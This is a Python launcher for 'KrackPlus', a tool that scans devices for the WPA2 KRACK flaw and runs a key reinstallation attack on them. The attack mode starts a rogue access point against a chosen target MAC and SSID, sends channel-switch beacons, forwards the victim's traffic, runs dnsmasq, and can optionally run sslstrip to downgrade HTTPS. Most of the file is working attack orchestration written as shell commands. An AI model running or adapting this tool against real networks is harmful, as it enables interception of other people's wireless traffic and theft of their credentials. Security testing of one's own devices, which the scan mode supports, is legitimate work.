#!/usr/bin/env python

import sys
import optparse
import subprocess
import atexit
import logging
# to move pcap files
import shutil
import os
# to implement progress bar.
import click
from parser import *
from multiprocessing import Process
from subprocess import check_output

# install colorlog if not already present on system
subprocess.call(["./prepareKrackPlus.sh"])
from colorlog import ColoredFormatter

# For colored output
LOGFORMAT = "%(log_color)s%(message)s%(reset)s"
LOG_LEVEL = logging.DEBUG
logging.root.setLevel(LOG_LEVEL)
formatter = ColoredFormatter(LOGFORMAT)
stream = logging.StreamHandler()
stream.setLevel(LOG_LEVEL)
stream.setFormatter(formatter)
log = logging.getLogger('pythonConfig')
log.setLevel(LOG_LEVEL)
log.addHandler(stream) 

########   Examples which gives dirrent colored output    #################
#log.debug("A quirky message only developers care about")             WHITE
#log.info("Curious users might want to know this")                    GREEN
#log.warn("Something is wrong and all users should be informed")       YELLOW
#log.error("Serious stuff, this is red for a reason")                 RED
#log.critical("OH NO everything is on fire")                          SUPER RED/ORANGE

log.debug("KrackPlus is a tool to scan for and exploit the KRACK vulnerability in WPA2(CVE-2017-13077, CVE-2017-13078 & CVE-2017-13080 (--group)), discovered by Mathy Vanhoef.")
log.debug("KrackPlus 1.0 by Lars Magnus Trinborgholen, Fredrik Walloe and Lars Kristian Maehlum.\n")

def main():
    USAGE = "\nKrackPlus Scan:   ./krackPlus.py [-s]\n\t          ./krackPlus.py [-s] [--group] [--set-ssid SSID] [--set-password PASSWORD] [--path PATH]\nKrackPlus Attack: ./krackPlus.py [-a] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address] [--continuous-csa] [--pcap FILENAME]"

    parser = optparse.OptionParser(usage=USAGE)

    # Default path for reports and pcaps    
    path = 'reports/'
    # Attempt to detect a user's NICs and give advice how they should be used with the -a option
    subprocess.call(["bash displayInterfaces.sh"],shell=True)	

    # KRACK+ Scan options
    parser.add_option('--scan','-s', help="This option will create a network with SSID 'testnetwork' where the default password is 'abcdefgh'."
                      " Simply connect to the network and the scan will be executed against the connected device.", dest='scan', default=False, action='store_true')
    parser.add_option('--set-ssid', default='testnetwork', help="Use this option to set the SSID for the created network.", dest='ssid')
    parser.add_option('--set-password', default='abcdefgh', help="Use this option to set the password for the created network."
                      " Password length has to be 8 characters or more!", dest='password')
    parser.add_option('--path', '-p', help="Set path where scan report should be saved", dest='path')
    parser.add_option("--group", help="Only perform scan of  the group key handshake", dest='group', action='store_true')
 # KRACK+ Attack options
    # Required arguments
    parser.add_option('--attack', '-a', default=False, help="This option will run a key reinstallation attack against ....", dest='attack', action='store_true')
    parser.add_option('--nic-mon', help="This option is used to specify Wireless monitor interface that will listen on the"
                        "channel of the target AP. Should be your secondary NIC, i.e USB NIC.", dest='mon')
    parser.add_option('--nic-rogue-ap', help="This option is used to specify Wireless monitor interface that will run a rogue AP"
                        "using a modified hostapd.", dest='rogue')
    parser.add_option('--target-ssid', help="This option is used to specify target network/ssid", dest='targetSSID')
    parser.add_option('--target', '-t', help="This option is used to specifiy target device using MAC-adress when running attack.", dest='target')
    # Optional arguments
    # TODO: this should work, but unable to test without compatible secondary external NIC. Commented out until we've verified that this works. 
    #parser.add_option("-m", "--nic-rogue-monitor", help="Wireless NIC that will listen on the channel of the rogue AP.", dest='monRogue')
    parser.add_option('--pcap', help="Save packet capture to file as a pcap. Provide a filename; $NIC.pcap will be appended to the name. Not compatible with --dd", dest='pcap')
    parser.add_option('--sslstrip', help="Use this option to enable sslstrip in an attempt to downgrade HTTPS to HTTP.", action='store_true')
    parser.add_option("-c", "--continuous-csa", help="Continuously send CSA beacons on the real channel (10 every second) in order to push the target to the channel of the rogue AP", dest='csa', action='store_true')
    
    # General KRACK+ options:
    parser.add_option('--restore', '-r', help="This option will restore internet connection (wifi). Hopefully you'll never have to use this option.", dest='restore', default=False, action='store_true')
    parser.add_option('-d', help="This option will increase output verbosity for KrackPlus Scan or Attack", dest='debug', action='store_true')
    parser.add_option('--dd', help="This option will increase output verbosity even more for KrackPlus Scan or Attack (debugging purposes). Can be combined with -d", dest='dd', action='store_true') 
    
    options, args = parser.parse_args()
    
    ############# SCAN ################
    if options.scan and not options.attack:
        # Write the credentials to file, so that they can be used next time the program runs.
        with open('./networkCredentials.txt', 'w') as netCredentials:
            if len(options.password) >= 8:
                netCredentials.write(options.ssid + '\n' + options.password)
            else:
                log.warn("Password length has to be longer than 8 characters, try again or don't specify password; the default password is 'abcdefgh'.")
                sys.exit()
	    
        # Attempt to launch scan, write output to file and display output on screen
        try:
            subprocess.call(["./prepareClientScan.sh"])
            log.info("Running KRACK+ Scan:")
            log.warn("Connect to '" + options.ssid + "' with '" + options.password + "' to scan devices.")
            log.warn("Wait for the scan to finish or press 'ctrl-c' to end/abort scan and generate PDF of current findings.")
      	    with open('./scanOutput.txt', 'w') as scanOutput:
                if options.scan and options.debug:
                    subprocess.call(["./findVulnerable/krackattack/krack-test-client.py"], shell=True)
                elif options.scan and options.dd:
                    subprocess.call(["./findVulnerable/krackattack/krack-test-client.py --debug"], shell=True)
                elif options.group:
                    subprocess.call(["./findVulnerable/krackattack/krack-test-client.py --group &"], stdout=scanOutput, shell=True)
                    scanParser()
                    raise KeyboardInterrupt 
                else:
                    subprocess.call(["./findVulnerable/krackattack/krack-test-client.py &"], stdout=scanOutput, shell=True)
                    scanParser()
                    raise KeyboardInterrupt 
                    
        except(KeyboardInterrupt, SystemExit):
            subprocess.call(["clear"], shell=True)
            # Display a progress bar while the report generates 
            with click.progressbar(range(25000), label="Cleaning up and generating PDF") as bar:
                for i in bar:
                    pass
            # Generates report of results in user-supplied or default location and tells user where it is
            writeResults()
            # TODO It should not be necessary to make this file, but that requires a rewrite of generatePDF
            if options.group:
                                subprocess.call(["touch vulnToPairwise.txt"], shell=True)
            if options.path:
                subprocess.call(["./genPDF.py " + options.path + " &"], shell=True)
                #log.info("PDF generated in '" + options.path + "'.")
                path=options.path		    
            else: 
                subprocess.call(["./genPDF.py " + path + " &"], shell=True)
            log.info("PDF generated in '" + path + "'.")
            subprocess.call(["./restoreClientWifi.sh"])
            # Removes temporary files
            subprocess.call(["rm scanOutput.txt"], shell=True)
            subprocess.call(["rm allScanned.txt"], shell=True)
            subprocess.call(["rm vulnToPairwise.txt"], shell=True)
            subprocess.call(["rm vulnToGroup.txt"], shell=True)
                    
        except:
            log.error("Error occurred.")
            log.info("Restoring internet connection.")
            log.info("Output generated by the scan can be found in scanOutput.txt.")
            subprocess.call(["./restoreClientWifi.sh"])


    ############# ATTACK ################
    elif options.attack and options.mon and options.rogue and options.target and options.targetSSID and not options.scan:
        try:
            log.info("Performing key reinstallation attack")
         
            # Sets up dependencies before the attack script runs
            subprocess.call(["./prepareClientAttack.sh"])      
            with open('./attackOutput.txt', 'w') as attackOutput:

		        # Gives error if user attempts to combine pcap option with either debugging option.
                if options.pcap and (options.dd or options.debug):		
			        raise KeyboardInterrupt("ERROR: cannot combine pcap with -d or --dd")

			    #TODO refactor this section; unnecessary repetition of code
    
                # Subprocess runs script from Vanhoef's repository, to avoid problems with the temporary files his script creates
                elif options.dd:
		            # Runs attack with debug enabled
		            subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
		                                 options.mon + " " + options.targetSSID + " --target " + options.target + " --debug &"], stdout=attackOutput, shell=True)
		        
                # Saves pcap from attack to file and moves it to the reports folder 
                elif options.pcap and not options.csa:	 
                    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                         options.mon + " " + options.targetSSID + " --target " + options.target + " --dump " + options.pcap + " &"], stdout=attackOutput, shell=True)
                
                # Starts sslstrip and runs it in the background
                elif options.sslstrip:
                    subprocess.Popen(["sslstrip -w reports/sslstrip.log &"], shell=True)
                
                # TODO A fix is needed to make --group work on the attack side. Commented out for that reason.
                # Starts the attack against the group key only
                #elif options.group:
                #    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                #                         options.mon + " " + options.targetSSID + " --target " + options.target + "- " + "--group" + " &"], stdout=attackOutput, shell=True)                
                
                # TODO: this should work, but unable to test without compatible secondary external NIC. Commented out until we've verified that this works. 
                # Starts the attack with the monitor interface enabled
                #elif options.monRogue:
                #    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py -m" + options.monRogue + " " + options.rogue + " " +
                #                         options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
            
                # Starts attack and sends CSA beacons every 10 seconds
                elif options.csa and not options.pcap:
                    log.info("Performing Key reinstallation attacks with continuous CSA")
                    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                         options.mon + " " + options.targetSSID + " --target " + options.target + " --continuous-csa" + " &"], stdout=attackOutput, shell=True)

                # Launches the 'standard' attack, without pcap, debug or CSA enabled. 
                else:
                    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                         options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
                
                # Forward traffic        
                subprocess.Popen(["cd krackattacks-poc-zerokey/krackattack/ && bash enable_internet_forwarding.sh > /dev/null &"], shell=True)
                # Start dnsmasq #TODO implement or remove
                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && dnsmasq -d -C dnsmasq.conf --quiet-dhcp --quiet-dhcp6 --quiet-ra > /dev/null &"], shell=True)

                        
                log.info("Open Wireshark to see traffic")
		        # User will only see relevant output, unless debug is on
                if options.debug:
			        log.info("Debug enabled")
                else:            	
			        attackParser()

        # KeyBoardInterrupt exceptions occurs when the user presses Ctrl+C or user attempts to use invalid options
        except KeyboardInterrupt:
       	    subprocess.call(["clear"], shell=True)
            log.info("Cleaning up and restoring wifi ...")
            subprocess.call(["rm attackOutput.txt"], shell=True)
            # kills dnsmasq and sslstrip (if user used the sslstrip option)
            subprocess.call(["./killProcesses.sh dnsmasq"], shell=True)
            # kills sslstrip provided that the user chose to enable it 
            if options.sslstrip:
                subprocess.call(["./killProcesses.sh sslstrip"], shell=True)
            subprocess.call(["./restoreClientWifi.sh"])
            # stop forwarding traffic
            subprocess.call(["sysctl net.ipv4.ip_forward=0 > /dev/null"], shell=True) 
            # move packet captures to the correct folder
            if options.pcap:
                log.info("Moving packet capture file to reports/")
                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && mv *.pcap ../../reports/"], shell=True)

        # Catches general errors. 
        except:
            subprocess.call(["clear"], shell=True)
            log.error("Error occurred. Restoring wifi ...")
            subprocess.call(["rm attackOutput.txt"], shell=True)
            subprocess.call(["./restoreClientWifi.sh"])
            # kills dnsmasq and sslstrip (if user used the sslstrip option)
            subprocess.call(["./killProcesses.sh dnsmasq"], shell=True)
            # stop forwarding traffic
            subprocess.call(["sysctl net.ipv4.ip_forward=0 > /dev/null"], shell=True) 
            # kills sslstrip provided that the user chose to enable it 
            if options.sslstrip:
                subprocess.call(["./killProcesses.sh sslstrip"], shell=True)
            # move packet captures to the correct folder
            if options.pcap:
                log.info("Moving packet capture file to reports/")
                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && mv *.pcap ../../reports/"], shell=True)


    ############# RESTORE INTERNET ################        
    elif options.restore:
        log.debug("Restoring internet connection")
        subprocess.call(["./restoreClientWifi.sh"])
        log.info("Done, it'll take a few seconds for the client to connect to your Wi-Fi again, if 'auto-reconnect' is enabled on your device")

    ########## WRONG USAGE ###########    
    elif options.attack and options.scan:
        log.warn("Scan and attack cannot be run simultaneously. Please specify either [-a] or [-s].")
        parser.print_help()

    elif options.attack and options.group:
        log.warn("Attack against the group key-handshake specifically, is not implemented. Please see usage below and try again!")
        parser.print_help()

    ######## NO OPTION GIVEN #########
    else:
        log.warn("No option was given or there were missing arguments, please see usage below and try again!")
        parser.print_help()

if __name__ == '__main__':
    main()
